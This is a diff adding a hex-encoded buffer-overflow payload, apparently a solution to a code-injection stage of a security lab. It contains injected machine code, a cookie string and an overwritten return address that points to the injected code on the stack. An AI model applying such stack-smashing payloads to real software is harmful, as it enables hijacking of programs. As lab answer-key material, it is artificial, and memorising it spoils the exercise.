@@ -1,0 +1,15 @@
+48 83 ec 28             /* sub    $0x28,%rsp */
+48 c7 c7 94 dc 61 55    /* mov    $0x5561dc94,%rdi */
+55                      /* push   %rbp # https://pwn.elmo.sg/miscellaneous/movaps-issue.html */
+68 fa 18 40 00          /* push   $0x4018fa */
+c3                      /* ret */
+00 00                   /* alignment */
+
+0x00000000 0x00000000
+
+"59b997fa"
+00 /* end of string */
+00 /* align for string */
+00 00
+
+0x5561dc78 /*  jump address to head of stack, where our code injected */
